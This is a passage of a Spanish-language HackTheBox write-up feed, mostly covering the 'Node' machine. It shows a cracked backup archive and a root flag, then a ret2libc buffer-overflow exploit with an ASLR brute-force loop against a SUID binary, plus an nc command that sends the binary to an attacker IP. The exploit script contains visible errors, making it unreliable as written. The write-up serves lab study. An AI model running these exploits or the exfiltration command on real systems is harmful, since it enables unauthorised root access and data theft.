+                _______________________________________________
+             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
+          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
+       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
+    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
+ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
+:-----------------------------------------------------------------------------:
+`---._.-----------------------------------------------------------------._.---'
+
+
+ [+] Validated access token
+ [+] Starting archiving root
+ [+] Finished! Encoded backup is below:
+
+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
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos devuelve un resultado en base64, y si lo decodeamos obtenemos un archivo comprimido, y al unzipearlo nos pide ingresar una contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip file
+Archive:  file
+[file] root/.profile password: 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos usar la que previamente obtuvimos con &lt;code&gt;fcrackzip&lt;/code&gt; ya que se puede estar reutilizando la contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip file
+Archive:  file
+[file] root/.profile password: 
+  inflating: root/.profile           
+ extracting: root/.cache/motd.legal-displayed  
+ extracting: root/root.txt           
+  inflating: root/.bashrc            
+  inflating: root/.viminfo           
+ extracting: root/.nano/search_history  
+❯ 
+❯ ls
+ root   file
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Efectivamente logramos descomprimirlo usando la contraseña previa &lt;code&gt;magicword&lt;/code&gt;, ahora podemos ver lo que hay dentro del directorio y encontramos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cd root
+❯ ls
+ root.txt
+❯ cat root.txt
+98ef491742abffa14a62facb8d832818
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;explotacion-alterna&quot;&gt;EXPLOTACION ALTERNA  &lt;a href=&quot;#explotacion-alterna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Vimos anteriormente que pudimos leer la flag &lt;code&gt;root.txt&lt;/code&gt;, pero no logramos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt; al sistema. Anteriormente vimos que al binario &lt;code&gt;backup&lt;/code&gt;, le pasabamos un parametro final correspondiente a un directorio, pero si tratamos de pasar muchos caracteres como ultimo parametro hacemos que el programa se corrompa.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print(&quot;A&quot;*40000)')   
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print(&quot;A&quot;*40000)')
+Segmentation fault (core dumped)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que se acontece un desbordamiento de buffer o &lt;code&gt;bufferoverflow&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a traernos el binario a nuestro equipo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/usr/local/bin$ nc 10.10.16.2 443 &amp;lt; backup
+nc 10.10.16.2 443 &amp;lt; backup
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para ejecutarlo sin problemas, voy a crearme un directorio y el archivo donde se almacenan las keys.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir /etc/myplace
+❯ nvim /etc/myplace/keys
+❯ cat /etc/myplace/keys
+a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para poder ver los registros al ejecutar el binario a bajo nivel usare &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  r a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python3 -c 'print(&quot;A&quot;*3000)')
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que se acontece el desbordamiento sobrescribiendo los registros y que alteran el flujo del programa, esto termina corrompiendolo cuando introducimos muchos caracteres capaces de sobrepasar el tamaño del buffer asignado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/buff.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si quieres saber mas acerca de esto te dejo el siguiente articulo:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://keepcoding.io/blog/que-es-un-buffer-overflow/&quot;&gt;https://keepcoding.io/blog/que-es-un-buffer-overflow/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Lo que podriamos hacer es que el flujo del programa podemos meterlo en la pila, donde a traves de un shellcode podemos ejecutar comandos y otorgarnos una reverse shell.&lt;/p&gt;
+
+&lt;p&gt;Pero si vemos las protecciones del binario este cuenta con  &lt;code&gt;data execution prevention&lt;/code&gt;. &lt;code&gt;NX&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  checksec
+[+] checksec for '/home/fmiracle/Machines/Node/content/backup'
+[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Asi que necesitamos buscar otra forma de explotar del binario. Podemos usar un &lt;code&gt;ret2libc&lt;/code&gt; que lo que hace es aprovecharse la la libreria &lt;code&gt;libc&lt;/code&gt; que el binario esta utilizando.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/usr/local/bin$ which backup | xargs ldd
+which backup | xargs ldd
+	linux-gate.so.1 =&amp;gt;  (0xf7723000)
+	libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf7564000)
+	/lib/ld-linux.so.2 (0xf7724000)
+tom@node:/usr/local/bin$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Con ello en vez de mandar el flujo del programa a la pila, podemos usar el &lt;code&gt;libc&lt;/code&gt; para ejecutar una llamada a nivel de sistema.&lt;/p&gt;
+
+&lt;p&gt;Para ello necesitamos primero saber si la maquina cuenta con &lt;code&gt;ÀSLR&lt;/code&gt; &lt;code&gt;aleatorizacion de direcciones de la memoria&lt;/code&gt;, ello podemos verificarlo leyendo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat /proc/sys/kernel/randomize_va_space
+2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Al tener un valor de 2, quiere decir que la maquina si cuenta con &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Otra forma de verlo seria usando la siguente expresión, donde podemos ver que efectivamente cuenta con &lt;code&gt;ASLR&lt;/code&gt; al cambiar las direcciones.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;for i in $(seq 1 10); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
+&amp;lt;ch backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done  
+0xf7553000
+0xf752d000
+0xf75a7000
+0xf75bc000
+0xf7579000
+0xf7618000
+0xf75ff000
+0xf7613000
+0xf7601000
+0xf7556000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Pero pese a que exista &lt;code&gt;ASLR&lt;/code&gt;, al no ser muy largas pueden repetirse, por tanto aunque sean aleatorios pueden volver a repetirse al haber una colision, podemos burlar el &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;for i in $(seq 1 1000); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
+&amp;lt;grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
+0xf752d000
+0xf752d000
+0xf752d000
+bash: break: only meaningful in a `for', `while', or `until' loop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora para poder ejecutar un &lt;code&gt;ret2lib&lt;/code&gt; y poder ejecutar una llamada a nivel de sistema necesitaremos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;La dirección de system&lt;/li&gt;
+  &lt;li&gt;La dirección de exit&lt;/li&gt;
+  &lt;li&gt;La dirección de la cadena &lt;code&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Basicamente lo que queremos lograr es &lt;code&gt;os.system(&quot;/bin/sh&quot;)&lt;/code&gt; y al ser el binario &lt;code&gt;suid&lt;/code&gt; lo hara como &lt;code&gt;root&lt;/code&gt; y ganaremos acceso como este usuario.&lt;/p&gt;
+
+&lt;p&gt;Para ello primero debemos de saber de las &lt;code&gt;A&lt;/code&gt; que insertamos antes cuantas debemos insertar para tener control del registro &lt;code&gt;eip&lt;/code&gt;. Para lo cual podemos usar &lt;code&gt;pattern create&lt;/code&gt; y generar un numero de cadena aleatoria.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  pattern create 1000
+[+] Generating a pattern of 1000 bytes (n=4)
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
+[+] Saved as '$_gef0'
+gef➤  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Insertamos la cadena generada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora con &lt;code&gt;pattern offset&lt;/code&gt; podemos saber cual es el limite para sobreescribir &lt;code&gt;eip&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  patter offset $eip
+[+] Searching for '$eip'
+[+] Found at offset 512 (little-endian search) likely
+[+] Found at offset 320 (big-endian search)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que necesitamos &lt;code&gt;512&lt;/code&gt; caracteres antes de sobrescribir &lt;code&gt;eip&lt;/code&gt;. Verificamos con la ayuda de python imprimiendo &lt;code&gt;512 A&lt;/code&gt; y adicionamos &lt;code&gt;4 B&lt;/code&gt;, que como resultado ahora el registro &lt;code&gt;eip&lt;/code&gt; valdria &lt;code&gt;BBBB&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora que sabemos el offset lo siguiente sera encontrar las direcciones de system, exit y sh. Y para ello primero vamos a coger una dirección base de libc, puede ser cualquiera &lt;code&gt;0xf752d000&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Teniendo esto podemos ir armandonos un script en python. Donde primero especificamos el offset de caracteres, debemos encontrar primero los offsets de las direcciones de &lt;code&gt;system, exit y binsh&lt;/code&gt;. Ya que una vez tengamos estos podamos obtener las direcciones reales de estas usando la &lt;code&gt;libc_base + los offsets&lt;/code&gt; de cada una.&lt;/p&gt;
+
+&lt;p&gt;Y usamos pack para representar las direcciones en &lt;code&gt;litelediam&lt;/code&gt; y evitar darle la vuelta a las direcciones.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
+
+
+from struct import pack
+
+offset = 512
+
+junk = &quot;A&quot;*offset
+
+#ret2lib - EIP  -&amp;gt; system -&amp;gt; exit -&amp;gt; /bin/sh
+
+libc_base_add = 0xf752d000
+
+system_add_offset = 
+
+exit_add_offset = 
+
+binsh_add_offset = 
+
+
+system_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + system_add_offset )
+
+exit_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + exit_add_offset)
+
+binsh_add_real = pack(&quot;&amp;lt;I&quot;), libc_base_add + binsh_add_offset)
+
+
+payload = junk + system_add_real + exit_add_real + binsh_add_real
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finalmente como payload deberiamos pasarle el junk sumado mas las direcciones reales de system, exit y binsh.&lt;/p&gt;
+
+&lt;p&gt;Ahora para conseguir los offset, primero usaremos &lt;code&gt;readelf&lt;/code&gt; para las direcciones de &lt;code&gt;system y exit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;readelf -s /lib32/libc.so.6 | grep -E &quot; system@@| exit@@&quot;
+&amp;lt;adelf -s /lib32/libc.so.6 | grep -E &quot; system@@| exit@@&quot;                     
+   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Y para obtener el offset de binsh, podemos usar &lt;code&gt;strings&lt;/code&gt; con los siguientes parametros:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;strings -a -t x /lib32/libc.so.6 | grep &quot;/bin/sh&quot;
+ 15900b /bin/sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora solo debemos correr el programa multiples veces, para causar una colision en las direcciones hasta que &lt;code&gt;libc&lt;/code&gt; valga lo que ejecutamos en el script.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
+
+
+from struct import pack
+
+offset = 512
+
+junk = &quot;A&quot;*offset
+
+#ret2lib - EIP  -&amp;gt; system -&amp;gt; exit -&amp;gt; /bin/sh
+
+libc_base_add = 0xf752d000
+
+system_add_offset = 0x0002e7b0
+
+exit_add_offset = 0x0003a940
+
+binsh_add_offset = 0x0015900b
+
+system_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + system_add_offset )
+
+exit_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + exit_add_offset)
+
+binsh_add_real = pack(&quot;&amp;lt;I&quot;), libc_base_add + binsh_add_offset)
+
+
+payload = junk + system_add_real + exit_add_real + binsh_add_real
+
+print(payload)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejecutamos el exploit multiples veces y se ejecuta la &lt;code&gt;/bin/sh&lt;/code&gt; y ganamos acceso como el usuario &lt;code&gt;root&lt;/code&gt;, ahora solo debemos dirigirnos al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;while true; do backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python exploit.py); done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# whoami
+root
+#cd /root
+cat root.txt
+98ef491742abffa14a62facb8d832818
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Mon, 17 Jul 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Node</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Node</guid>
+        
+        <category>Information Leaked</category>
+        
+        <category>Api Enumeration</category>
+        
+        <category>Cracking Hashes</category>
+        
+        <category>MongoDB Enumeration</category>
+        
+        <category>MongoTask Injection</category>
+        
+        <category>SUID Binary Explotation</category>
+        
+        <category>Buffer Overflow</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Luanne - htb writeup</title>
@@ -6009,459 +6829,6 @@ dd6d458838b1d2c778b789eeb79ab063
         <category>Image File Upload (Playing with .htaccess)</category>
         
         <category>Abusing sudo privilege (CVE-2019-14287)</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Netmon - htb writeup</title>
-        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Netmon&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt; dificultad facil, la cual explotaremos a partir de una enumeración por &lt;code&gt;ftp&lt;/code&gt; donde obtendremos archivos de configuración con credenciales que nos permitiran conectarnos al servicio web y despues nos aprovecharemos de una vulnerabilidad de &lt;code&gt;PRTG&lt;/code&gt; que nos permitira realizar la creación de un usuario a nivel de sistema y le añadiremos permisis de administrador, para finalmente conectarnos al sistema como el usuario &lt;code&gt;administrator&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Netmon
-❯ ls
- Netmon
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.152
-PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
-64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=200 ms
-
---- 10.10.10.152 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 199.775/199.775/199.775/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
